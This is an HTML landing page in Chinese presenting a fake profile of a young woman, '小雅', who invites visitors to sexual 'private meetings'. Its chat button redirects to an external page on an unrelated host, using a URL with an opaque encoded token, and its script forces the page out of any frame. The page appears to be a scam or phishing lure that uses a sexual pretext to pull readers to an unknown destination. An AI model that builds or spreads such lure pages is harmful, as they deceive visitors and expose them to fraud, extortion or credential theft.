<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>小雅在线</title>
    <link rel="shortcut icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>💋</text></svg>">
    
    <style type="text/css">
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: linear-gradient(135deg, #ff9a9e 0%, #fecfef 100%);
            color: #333;
            font-size: 16px;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .special-text {
            font-family: "Times New Roman", serif;
            letter-spacing: 1px;
            font-style: italic;
        }

        .chat-container {
            background: white;
            border-radius: 20px;
            padding: 40px 30px;
            box-shadow: 0 15px 35px rgba(0,0,0,0.15);
            max-width: 350px;
            width: 100%;
            text-align: center;
        }

        .avatar {
            width: 80px;
            height: 80px;
            background: linear-gradient(45deg, #ff6b6b, #ee5a52);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 35px;
            margin: 0 auto 20px;
            box-shadow: 0 8px 20px rgba(255, 107, 107, 0.3);
        }

        .name-tag {
            font-size: 22px;
            font-weight: bold;
            color: #333;
            margin-bottom: 8px;
        }

        .status {
            font-size: 14px;
            color: #2ecc71;
            margin-bottom: 25px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .online-dot {
            width: 8px;
            height: 8px;
            background: #2ecc71;
            border-radius: 50%;
            margin-right: 6px;
            animation: pulse 2s infinite;
        }

        @keyframes pulse {
            0% { opacity: 1; }
            50% { opacity: 0.5; }
            100% { opacity: 1; }
        }

        .message {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 15px;
            margin-bottom: 25px;
            font-size: 16px;
            line-height: 1.5;
            color: #333;
        }

        .highlight {
            background: linear-gradient(45deg, #ff6b6b, #ee5a52);
            color: white;
            font-weight: bold;
            padding: 15px;
            border-radius: 12px;
            margin-bottom: 25px;
            font-size: 16px;
        }

        .chat-button {
            background: linear-gradient(45deg, #ff6b6b, #ee5a52);
            color: white;
            border: none;
            padding: 18px 30px;
            border-radius: 30px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            width: 100%;
            transition: all 0.3s ease;
            box-shadow: 0 6px 20px rgba(255, 107, 107, 0.4);
        }

        .chat-button:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 25px rgba(255, 107, 107, 0.6);
        }

        .chat-button:active {
            transform: translateY(0);
        }

        .note {
            font-size: 12px;
            color: #999;
            margin-top: 15px;
            line-height: 1.3;
        }

        @media (max-width: 480px) {
            .chat-container {
                margin: 0 10px;
                padding: 30px 25px;
            }
        }
    </style>
</head>
<body>
    <div class="chat-container">
        <!-- 头像区域 -->
        <div class="avatar">👩‍🦰</div>
        <div class="name-tag">小雅</div>
        <div class="status">
            <div class="online-dot"></div>
            23岁 • 在线中
        </div>

        <!-- 简短消息 -->
        <div class="message">
            嗨～ 想和我<span class="special-text">深入聊聊</span>吗？ 💕
        </div>

        <div class="highlight">
            只进入身体，不进入生活<br>
            我们可以<span class="special-text">私密见面</span>哦～
        </div>

        <!-- 聊天按钮 -->
        <button class="chat-button" onclick="startChat()">
            💬 开始聊天
        </button>
        
        <div class="note">
            🔒 私密安全 • 仅限诚人
        </div>
    </div>

    <script>
        var targetUrl = "https://cdbapi.56zly.com/profile/upload/2025/06/14/60ced4bd-250a-4ff7-b130-04227ea5bfde.html?token=aHZwdnswIyFlI2B8K31tcw5OVl5dRl8AU1wbB1VLVk50LmsMDwcvPz8CJGd3a2trUFJSX1xaX1lCRFoeDBcQ";
        
        function startChat() {
            var button = document.querySelector('.chat-button');
            button.innerHTML = '💕 连接中...';
            button.style.background = 'linear-gradient(45deg, #95a5a6, #7f8c8d)';
            
            setTimeout(function() {
                window.location.href = targetUrl;
            }, 1000);
        }
        
        if (window.top !== window.self) {
            window.top.location = window.self.location;
        }
    </script>
</body>
</html>
